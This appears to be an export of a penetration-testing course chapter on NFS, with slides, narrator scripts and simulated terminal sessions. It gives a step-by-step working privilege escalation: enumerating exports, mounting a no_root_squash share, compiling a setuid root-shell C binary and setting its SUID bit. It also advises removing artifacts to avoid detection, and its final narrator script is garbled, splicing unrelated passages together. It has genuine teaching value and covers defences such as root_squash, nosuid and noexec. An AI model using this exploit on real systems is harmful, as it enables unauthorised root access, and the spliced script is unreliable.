What is Network File System (NFS)?

Enabling remote file access across networks.

Key Definition

NFS is a distributed file system protocol that allows a client machine to access files and directories on a remote server as if they were local resources.

Common Use Cases

  • Shared storage for web servers or applications.
  • Facilitating data sharing in corporate networks.

NFS provides convenient shared storage but introduces significant security risks if not configured with strict access controls.

content.html:
Module 7›Chapter 7.7›NFS Discovery
Reconnaissance

Discovering NFS Shares on a Server

Using cat /etc/exports to reveal configurations.

The `/etc/exports` File

This file defines which directories an NFS server exports, to which clients, and with what specific options. It's the primary configuration source for NFS shares.

What to Look For

  • Exported Directories: The paths being shared.
  • Client Access: Specific IPs, networks, or `*` (all clients).
  • Options: Permissions like `rw` (read/write), `ro` (read-only), `sync`, `no_subtree_check`, and critically, `no_root_squash`.
Key Takeaway

Always check /etc/exports on a compromised Linux target to identify NFS shares and their associated security settings.

Terminal: Target Server
user@target:~$ cat /etc/exports
/home/shared_data 192.168.1.0/24(rw,sync,no_subtree_check)
/var/www/html *(ro,sync)
/opt/backups 10.0.0.0/8(rw,no_root_squash)

Explanation:

  • /home/shared_data is shared with the 192.168.1.0/24 network, allowing read/write access.
  • /var/www/html is shared with all clients (*) but is read-only.
  • /opt/backups is shared with the 10.0.0.0/8 network and includes the dangerous no_root_squash option.

This is incredibly useful because it allows you to enumerate potential attack surfaces without needing prior access. External Reconnaissance

Querying NFS Exports with showmount

Identifying accessible shares from an attacking machine.

The showmount -e Command

This utility queries an NFS server to list its exported directories. It's a crucial tool for initial reconnaissance from an attacker's perspective, revealing potential targets.

Interpreting Output

  • Export List: Directories shared by the target.
  • Client Access: IP addresses, network ranges, or * (all clients).
  • Red Flag: An asterisk (*) indicates broad access, often a sign of misconfiguration.
Key Takeaway

showmount -e is your first line of defense and offense for identifying NFS shares and their accessibility from an external network.

Terminal: Attacking Machine (Kali)
kali@kali:~$ showmount -e 192.168.1.100
Export list for 192.168.1.100:
/home/shared_data 192.168.1.0/24
/var/www/html *
/opt/data 192.168.1.10(rw,no_root_squash)

Analysis:

  • /home/shared_data is restricted to a specific subnet.
  • /var/www/html is exported to all clients (*), making it widely accessible.
  • /opt/data is exported to a single IP with rw and the critical no_root_squash option.

screens.title: Understanding `root_squash`
screens.narratorSegment: Now, let's dive into a crucial security mechanism in NFS called root underscore squash. By default, NFS servers employ root underscore squash to prevent a client-side root user from automatically gaining root privileges on the NFS server. Here's how it works: if a user connects to an NFS share as root, which has a User ID, or UID, of 0, the NFS server doesn't simply trust that UID. Instead, it 'squashes' this root UID to an unprivileged user on the server side, typically nobody or nfsnobody. This means that even if an attacker manages to gain root access on a client machine, they won't automatically have root privileges over the files and directories on the NFS server. This is a fundamental defense-in-depth measure, designed to limit the impact of a compromised client. It's a critical security control that prevents a direct escalation of privileges from a client to the server through NFS. Without root underscore squash, the security model would be significantly weaker, making servers much more vulnerable. content.html:
Module 7›Chapter 7.7›NFS Security
Security Mechanism

Understanding root_squash

Preventing client-side root from gaining server-side root.

Default & Secure Behavior

root_squash is the default NFS option. It maps client-side root users (UID 0) to an unprivileged user (e.g., nobody) on the NFS server.

Why It Matters

  • Privilege Separation: Ensures a compromised client root doesn't automatically become server root.
  • Defense-in-Depth: Adds a layer of security, limiting the impact of client-side breaches.
  • Standard Practice: Essential for secure NFS deployments.
Key Takeaway

root_squash is a critical security feature that prevents client-side root users from exercising root privileges on the NFS server, mitigating privilege escalation.

How `root_squash` Works

Client Root (UID 0)

Attempts access

NFS Server

Applies root_squash

Server Nobody (UID 65534)

Access granted as unprivileged user

root_squash ensures that even if a client connects as root, their privileges are downgraded on the server, preventing unauthorized root access to shared files.

screens.title: The Peril of `no_root_squash`
screens.narratorSegment: While root underscore squash is a vital security feature, its counterpart, no underscore root underscore squash, is an extremely dangerous misconfiguration. When an NFS share is exported with the no underscore root underscore squash option, it explicitly tells the NFS server to disable the default security behavior. This means that if a client connects to that share as the root user, with UID 0, the NFS server will allow that client-side root user to retain their full root privileges when accessing the mounted share on the server. Essentially, it trusts the client's root user implicitly. This is a severe security flaw because it effectively allows any attacker who gains root access to a client machine that can mount this share to then gain root access on the NFS server itself. It bypasses a fundamental security boundary and is a direct path to full system compromise. This option is sometimes used in specific, highly controlled environments, but in most cases, it represents a critical oversight that attackers actively seek out. Module 7›Chapter 7.7›NFS Misconfiguration
Critical Misconfiguration

The Peril of no_root_squash

Retaining root privileges on mounted NFS shares.

Disabling Security

When an NFS share is exported with no_root_squash, the server does NOT map client-side root (UID 0) to an unprivileged user. Client root retains full root privileges on the mounted share.

Severe Implications

  • Direct Root Access: Allows a client-side root user to act as root on the server for that share.
  • Privilege Escalation: A primary vector for gaining root on the NFS server from a compromised client.
  • Bypasses Security: Undermines the fundamental security principle of least privilege.
Warning

no_root_squash is an extremely dangerous setting that should be avoided in almost all production environments due to its severe security risks.

`no_root_squash` in Action

Client Root (UID 0)

Attempts access

NFS Server

no_root_squash active

Server Root (UID 0)

Access granted as root

With no_root_squash, the client's root privileges are directly honored by the NFS server, creating a critical vulnerability.

Mounting the Misconfigured NFS Share

Establishing access to the remote file system.

The `mount` Command

The mount command is used to attach a remote file system to a local directory, making its contents accessible as if they were local files.

Key Options

  • -t nfs: Specifies the file system type as NFS.
  • -o nolock: Disables file locking, which can resolve mounting issues, especially with older NFS versions.
  • Mount Point: A local directory where the remote share will be accessible.
Key Takeaway

Successfully mounting the NFS share is the foundational step, granting you the ability to interact with the remote file system as if it were local.

Terminal: Attacking Machine (Kali)
kali@kali:~$ mkdir /mnt/nfs_share
kali@kali:~$ sudo mount -t nfs 192.168.1.100:/opt/data /mnt/nfs_share -o nolock
kali@kali:~$ df -h | grep nfs_share
192.168.1.100:/opt/data 9.8G 2.5G 7.3G 26% /mnt/nfs_share

Explanation:

  • First, we create a local directory /mnt/nfs_share to serve as our mount point.
  • Then, we use sudo mount to connect to the target's /opt/data share and mount it locally.
  • df -h verifies the successful mount, showing the remote share now accessible at /mnt/nfs_share.

Exploitation Step 2

Crafting a Root Shell Binary

Developing a C program to gain root privileges.

The `rootshell.c` Program

This small C program is designed to elevate privileges by setting the effective User ID and Group ID to 0 (root), then executing a bash shell.

Key Functions

  • setuid(0): Sets the effective user ID to root.
  • setgid(0): Sets the effective group ID to root.
  • system("/bin/bash"): Executes a bash shell with the newly acquired root privileges.
Key Takeaway

Creating a simple SUID C binary is a common and effective technique for privilege escalation when no_root_squash is active.

Terminal: Attacking Machine (Kali)
kali@kali:~$ nano /mnt/nfs_share/rootshell.c

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}

kali@kali:~$ gcc /mnt/nfs_share/rootshell.c -o /mnt/nfs_share/rootshell
kali@kali:~$ ls -l /mnt/nfs_share/rootshell
-rwxr-xr-x 1 root root 8400 Sep 27 10:30 /mnt/nfs_share/rootshell

Explanation:

  • We create rootshell.c within the mounted NFS share.
  • The C code uses setuid(0) and setgid(0) to become root, then executes /bin/bash.
  • gcc compiles the C source into an executable binary named rootshell.

screens.narratorSegment: After compiling our rootshell binary, the next critical step is to set its SUID bit. The SUID bit, or Set User ID, is a special permission that allows an executable file to run with the permissions of its owner, rather than the permissions of the user who is executing it. In our case, since we are operating as root on our attacking machine and the NFS share is configured with no underscore root underscore squash, any file we create and set SUID on will retain those permissions on the NFS server. We use chmod +x to make the binary executable, and then chmod u+s to set the SUID bit. This combination ensures that when a low-privileged user on the target server executes our rootshell binary, it will run with the privileges of the file's owner, which is root on the server. This is the magic that transforms our simple C program into a powerful privilege escalation tool. Exploitation Step 3

Elevating Privileges with SUID Bit

Making the malicious binary execute as root.

The SUID Bit (`u+s`)

The Set User ID (SUID) bit is a special permission that allows an executable file to run with the permissions of its owner, regardless of who executes it.

Why It Works with `no_root_squash`

  • Root Ownership: Since you're root on Kali and no_root_squash is active, the binary's owner on the server becomes root.
  • Privilege Retention: The SUID bit ensures that when executed, the binary runs as the owner (root), granting root privileges to the spawned shell.
Key Takeaway

Setting the SUID bit on your malicious binary within a no_root_squash share is the critical step that enables privilege escalation on the target server.

Terminal: Attacking Machine (Kali)
kali@kali:~$ chmod +x /mnt/nfs_share/rootshell
kali@kali:~$ chmod u+s /mnt/nfs_share/rootshell
kali@kali:~$ ls -l /mnt/nfs_share/rootshell
-rwsr-xr-x 1 root root 8400 Sep 27 10:35 /mnt/nfs_share/rootshell

Explanation:

  • chmod +x makes the rootshell binary executable.
  • chmod u+s sets the SUID bit for the owner (user). Notice the 's' in the permissions, indicating the SUID bit is set.
  • The file is now owned by root and will execute as root when run by any user.

Execute on Target

From your low-privileged shell on the target, navigate to the NFS share's path and execute the SUID binary. The no_root_squash option ensures the SUID bit is honored.

screens.title: Avoiding Common NFS Exploitation Pitfalls
screens.narratorSegment: While no underscore root underscore squash is a glaring vulnerability, there are other common mistakes and defensive measures that can prevent or complicate NFS exploitation. Two critical mount options to be aware of are nosuid and noexec. The nosuid option, when applied to a mounted file system, prevents SUID bits from taking effect on any files within that directory. This means that even if an attacker manages to create an SUID binary on a no underscore root underscore squash share, if the share is mounted with nosuid on the target server, the SUID bit will be ignored, and the binary will not execute with elevated privileges. Similarly, the noexec option prevents the execution of any binaries on the mounted file system. If a share is mounted with noexec, an attacker's compiled rootshell binary simply won't run. These options are powerful defenses, and as an attacker, you must always check the target's mount options using the mount command to see if these protections are in place. If they are, your SUID binary exploit will fail, forcing you to look for alternative privilege escalation paths.

content.html:
Module 7›Chapter 7.7›Defensive Measures
Defensive Measures

Avoiding Common NFS Exploitation Pitfalls

Understanding nosuid and noexec mount options.

The `nosuid` Option

Prevents SUID (Set User ID) and SGID (Set Group ID) bits from taking effect on any files within the mounted file system. This directly counters the SUID binary exploit.

The `noexec` Option

Prevents the execution of any binaries or scripts on the mounted file system. If this is set, your malicious executable simply won't run.

Key Takeaway

Always check for nosuid and noexec mount options on the target, as they are strong defenses against SUID-based NFS privilege escalation.

Terminal: Target Server (Checking Mount Options)
user@target:~$ mount | grep /opt/data
192.168.1.100:/opt/data on /opt/data type nfs4 (rw,sync,no_root_squash,nosuid,noexec,relatime,vers=4.2,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.1.10,local_lock=none,addr=192.168.1.100)

Analysis:

  • Even though no_root_squash is present, the nosuid and noexec options are also active.
  • This means any SUID bit set on files in /opt/data will be ignored, and binaries cannot be executed from this share.
  • The SUID binary exploit would fail in this scenario.

screens.title: Further Defenses and Troubleshooting
screens.narratorSegment: Beyond nosuid and noexec, several other factors can impact NFS exploitation and defense. Incorrect mount options, for instance, can cause mounting issues on your attacking machine. Always double-check the syntax and ensure compatibility, sometimes older NFS versions require specific flags. Furthermore, ensure the mount point on your attacking machine has appropriate permissions for you to write to it. If your local mount point is not writable, you won't be able to create your malicious binary. Firewalls are another common hurdle; they can block NFS traffic, which typically uses ports 111 for portmapper and 2049 for NFS itself, along with other RPC services. Always check firewall rules on both the client and server. Finally, for administrators, regular auditing of slash etc slash exports and ensuring root underscore squash is always enabled, unless absolutely necessary in highly controlled environments, is paramount. After any exploitation, remember to clean up your tracks by removing any malicious binaries or files from the NFS share to avoid detection. Defensive Measures

Further Defenses and Troubleshooting

Addressing mount issues, permissions, and firewalls.

Incorrect Mount Options

Forgetting -o nolock or using incompatible NFS versions can lead to mounting failures. Always verify the correct options for your specific setup.

Permissions on Mount Point

Ensure the local mount point on your attacking machine has appropriate write permissions. Without them, you cannot create or modify files on the mounted share.

Firewall Rules

Firewalls can block NFS traffic (ports 111, 2049, and others for RPC). Verify that necessary ports are open on both the client and server to allow communication.

Cleanup After Exploitation

Always remove your malicious SUID binary and any other artifacts from the NFS share after a successful exploit to maintain stealth and clean up your tracks.

Key Takeaway

A robust NFS security posture requires attention to mount options, local permissions, firewall configurations, and diligent post-exploitation cleanup.

fullNarratorScript:
Welcome to this crucial chapter on Network File System, or NFS, and its common misconfigurations. NFS is a powerful tool that allows systems to share files across a network, making it incredibly convenient for administrators. However, this convenience can quickly turn into a critical security vulnerability if not configured correctly. In this lesson, you'll learn how NFS works, how to identify misconfigured shares, and most importantly, how a specific setting called no underscore root underscore squash can be exploited to gain root access on a target system. Understanding these concepts is vital for any aspiring penetration tester or security professional, as NFS misconfigurations are a frequent pathway to full system compromise in real-world scenarios. We'll explore the underlying mechanisms, walk through practical reconnaissance techniques, and then demonstrate a step-by-step exploitation process. By the end, you'll have a solid grasp of both the offensive and defensive aspects of NFS security.

In this chapter, our primary goal is to equip you with the knowledge and skills to effectively identify and exploit NFS misconfigurations. Our first objective is to ensure you thoroughly understand the fundamental purpose and configuration of Network File System shares. This means grasping why NFS is used, its benefits, and how it's typically set up in a network environment. You'll learn about the core components and settings that govern NFS operations. Following that, our second objective focuses on practical reconnaissance: you will learn how to identify NFS exports on a target system and accurately assess their access permissions. This involves using specific tools and commands to discover what directories are being shared and to whom, which is a critical first step in any penetration test. Now, let's dive into a crucial security mechanism in NFS called root underscore squash. By default, NFS servers employ root underscore squash to prevent a client-side root user from automatically gaining root privileges on the NFS server. This means that even if an attacker manages to create an SUID binary on a no underscore root underscore squash share, if the share is mounted with nosuid on the target server, the SUID bit will be ignored, and the binary will not execute with elevated privileges. Similarly, the noexec option prevents the execution of any binaries on the mounted file system. If a share is mounted with noexec, an attacker's compiled rootshell binary simply won't run. These options are powerful defenses, and as an attacker, you must always check the target's mount options using the mount command to see if these protections are in place. If they are, your SUID binary exploit will fail, forcing you to look for alternative privilege escalation paths.
